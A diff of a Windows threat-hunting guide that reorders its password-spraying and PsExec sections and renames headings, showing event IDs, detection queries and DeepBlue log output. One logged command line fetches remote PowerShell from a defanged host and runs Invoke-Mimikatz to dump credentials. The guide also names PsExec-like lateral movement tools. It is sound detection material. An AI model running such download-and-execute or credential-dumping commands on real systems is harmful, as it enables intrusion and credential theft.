@@ -146,27 +146,6 @@ Unlock established RDP Sessions
 Remote Desktop Protocol / Terminal Services
 ```
 
-
-## Hunting Password Attacks
-Overall, looking for a rapid succession of failed attempts to the same machine, or multiple machines, repeatedly in a small amount of time with each attempt, may indicate Password Spraying/Guessing attack. 
-
-Of course, we know the attacker can change the timing between each attempt to make it look less suspicious. 
-
-|    ID                  |    Description      |
-|----------------------------|-------------------------|
-|    Event ID 4625       |    failed logon     |
-|    Logon Type 3        |    network logon    |
-
-### Hunting Successful / Failed Logons
-
-**Event ID 4625**
-- An account failed to log on Windows keeps track of the account log on failed activities under event ID 4625
-- Good indicator of brute force attack or password spraying
-- Once attacker is performing brute force attack, they tend to get failed logons
-- Password Spray is one way to get into the systems using collected dumped credentials such as pastebin, darkweb, paid services, etc
-- We also need to look for a rapid succession of failed attempts to the same machine, or machines, repeatedly for a small space of time with each attempt
-
-
 ## Hunting Pass The Hash
 We should also look for the Logon Process to be NtLmSsP and the key length to be set to 0
 You can read more about this technique, here:
@@ -204,44 +183,6 @@ If your network environment is accustomed to a lot of RDP connections into other
 - To hunt for RDP sessions, look for port 3389
 - Make sure to know the legitimate RDP applications running in your environment
 - RMM Tools - Ghost, Anydesk, TeamViewer, VNC Connect, LogmeIn
-
-## Hunting PsExec
-
-PsExec, part of the SysInternals Suite, is one of the common lateral movement tools, which provides the capability to execute remote commands. Due to the way that PsExec works, we can utilize the following Event IDs to hunt for it:
-
-|    ID                   |    Description                                             |
-|-----------------------------|----------------------------------------------------------------|
-|    Event ID 5145        |    (captures requests to shares, we are interested in ADMIN$ and IPC$) |
-|    Event ID 5140        |    (share successfully accessed)                                       |
-|    Event ID 4697 / 7045 |    (service creation)                                                  |
-|    Event ID 4688        |    Sysmon EID 1                                                        |
-
-**Sample Use Cases / Rules**
-
-PsExec Service Start
-```
-(EventID:"4688" AND CommandLine:"C\:\\Windows\\PSEXESVC.exe")
-```
-PsExec Tool Execution
-```
-(EventID:"7045" AND ServiceName:"PSEXESVC" AND ServiceFileName:"*\\PSEXESVC.exe") OR (EventID:"7036" AND ServiceName:"PSEXESVC") OR (EventID:"1" AND Image:"*\\PSEXESVC.exe" AND User:"NT AUTHORITY\\SYSTEM")
-```
-
-### Alternative to PsExec
-[RemCom](https://github.com/kavika13/RemCom)
-- RemCom is an open-source, redistributable utility providing the same remote management functions
-
-[PAExec](https://github.com/poweradminllc/PAExec)
-- PAExec features all the same functions of RemCom and PsExec by default, PAExec
-uses a named pipe containing the string PAExec combined with a unique process 
-identifier and computer name values
-
-
-[CSExec](https://github.com/malcomvetter/CSExec)
-- CSExec is a highly configurable, C# implementation of PsExec’s functionality. By 
-default, CSExec sends csexecsvc.exe to the remote computer and uses a named pipe 
-called \\.\pipe\csexecsvc
-
 
 ## Hunting WMI Persistence
 Hunting WMI usage for persistence involves th a WMI subscription. Therefore, our goal is to search identify any newly registered subscriptions. One way to achieve this is by utilizing WMI itself for that activity.
@@ -327,10 +268,30 @@ You can also check out resources from the Threat Hunting Project here, here
 - [Detecting Lateral Movement in Windows Event Logs](https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/lateral-movement-windows-authentication-logs.md )
 - [Lateral Movement Detection via Process Monitoring](https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/lateral_movement_detection_via_process_monitoring.md) 
 
-## Password guessing
+## Hunting Password Guessing
 |Event|Command|
 |-----|-------|
 |Password guessing|`.\DeepBlue.ps1 .\evtx\smb-password-guessing-security.evtx`|
+
+### Hunting Password Attacks
+Overall, looking for a rapid succession of failed attempts to the same machine, or multiple machines, repeatedly in a small amount of time with each attempt, may indicate Password Spraying/Guessing attack. 
+
+Of course, we know the attacker can change the timing between each attempt to make it look less suspicious. 
+
+|    ID                  |    Description      |
+|----------------------------|-------------------------|
+|    Event ID 4625       |    failed logon     |
+|    Logon Type 3        |    network logon    |
+
+### Hunting Successful / Failed Logons
+
+**Event ID 4625**
+- An account failed to log on Windows keeps track of the account log on failed activities under event ID 4625
+- Good indicator of brute force attack or password spraying
+- Once attacker is performing brute force attack, they tend to get failed logons
+- Password Spray is one way to get into the systems using collected dumped credentials such as pastebin, darkweb, paid services, etc
+- We also need to look for a rapid succession of failed attempts to the same machine, or machines, repeatedly for a small space of time with each attempt
+
 ```
 Date    : 9/19/2016 9:50:06 AM
 Log     : Security
@@ -398,7 +359,7 @@ Message      : An account failed to log on.
                 Key Length:             0
 ```
 
-## PSAttack
+## Hunting PSAttack
 |Event|Command|
 |-----|-------|
 |PSAttack|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx`|
@@ -493,7 +454,7 @@ Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /ful
 Decoded :
 ```
 
-## Password Spraying
+## Hunting Password Spraying
 
 |Event|Command|
 |-----|-------|
@@ -576,7 +537,7 @@ Account Name:           jwright           7
 Account Name:           Administrator     7
 ```
 
-## PowerSploit (Security/System)
+## Hunting PowerSploit (Security/System)
 |Event|Command|
 |-----|-------|
 |PowerSploit (security)|`.\DeepBlue.ps1 .\evtx\powersploit-security.evtx`|
@@ -668,7 +629,7 @@ Process Information:
         Process Command Line:   powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
 ```
 
-## Mimikatz `lsadump::sam`
+## Hunting Mimikatz `lsadump::sam`
 
 |Event|Command|
 |-----|-------|
@@ -709,7 +670,45 @@ Message      : A privileged service was called.
                 Privileges:             SeTcbPrivilege
 ```
 
-## Metasploit (PSEXEC) Native Target (Security)
+## Hunting PsExec
+
+PsExec, part of the SysInternals Suite, is one of the common lateral movement tools, which provides the capability to execute remote commands. Due to the way that PsExec works, we can utilize the following Event IDs to hunt for it:
+
+|    ID                   |    Description                                             |
+|-----------------------------|----------------------------------------------------------------|
+|    Event ID 5145        |    (captures requests to shares, we are interested in ADMIN$ and IPC$) |
+|    Event ID 5140        |    (share successfully accessed)                                       |
+|    Event ID 4697 / 7045 |    (service creation)                                                  |
+|    Event ID 4688        |    Sysmon EID 1                                                        |
+
+**Sample Use Cases / Rules**
+
+PsExec Service Start
+```
+(EventID:"4688" AND CommandLine:"C\:\\Windows\\PSEXESVC.exe")
+```
+PsExec Tool Execution
+```
+(EventID:"7045" AND ServiceName:"PSEXESVC" AND ServiceFileName:"*\\PSEXESVC.exe") OR (EventID:"7036" AND ServiceName:"PSEXESVC") OR (EventID:"1" AND Image:"*\\PSEXESVC.exe" AND User:"NT AUTHORITY\\SYSTEM")
+```
+
+### Alternative to PsExec
+[RemCom](https://github.com/kavika13/RemCom)
+- RemCom is an open-source, redistributable utility providing the same remote management functions
+
+[PAExec](https://github.com/poweradminllc/PAExec)
+- PAExec features all the same functions of RemCom and PsExec by default, PAExec
+uses a named pipe containing the string PAExec combined with a unique process 
+identifier and computer name values
+
+
+[CSExec](https://github.com/malcomvetter/CSExec)
+- CSExec is a highly configurable, C# implementation of PsExec’s functionality. By 
+default, CSExec sends csexecsvc.exe to the remote computer and uses a named pipe 
+called \\.\pipe\csexecsvc
+
+
+## Hunting Metasploit (PsExec) Native Target (Security)
 |Event|Command|
 |-----|-------|
 |Metasploit native target (security)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx`|
@@ -753,7 +752,7 @@ Message      : A new process has been created.
                 Creator Process ID:     0x1e8
                 Process Command Line:   cmd.exe /c echo hgabms > \\.\pipe\hgabms
 ```
-## Metasploit (PSEXEC) Native Target (System)
+## Hunting Metasploit (PsExec) Native Target (System)
 |Event|Command|
 |-----|-------|
 |Metasploit native target (system)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-system.evtx`|
@@ -852,7 +851,7 @@ Message      : A service was installed in the system.
                Service Account:  LocalSystem
 ```
 
-## Metasploit PowerShell Target (Security/System)
+## Hunting Metasploit PowerShell Target (PsExec) (Security/System)
 |Event|Command|
 |-----|-------|
 |Metasploit PowerShell target (security)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-security.evtx`|
